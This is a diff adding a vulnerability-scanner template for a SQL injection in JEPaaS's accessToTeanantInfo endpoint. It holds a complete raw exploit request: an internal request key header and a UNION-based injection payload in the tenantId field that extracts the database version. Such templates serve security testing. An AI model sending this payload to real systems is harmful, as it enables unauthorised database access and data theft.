@@ -1,0 +1,38 @@
+id: jepaas-accesstoteanantinfo-sqli
+
+info:
+  name: Jepaas accessToTeanantInfo - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Jepaas accessToTeanantInfo contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://mp.weixin.qq.com/s/Mveev-kqNe_Ik_CUYBk_Cw
+  tags: JEPaaS低代码平台
+
+http:
+  - raw:
+      - |
+        POST /rbac/im/accessToTeanantInfo HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.9
+        internalRequestKey: schedule_898901212
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+        tenantId=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717671,version()),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'totalCount'
+          - 'ROLENAMES'
+        condition: and
+      - type: status
+        status:
+          - 200
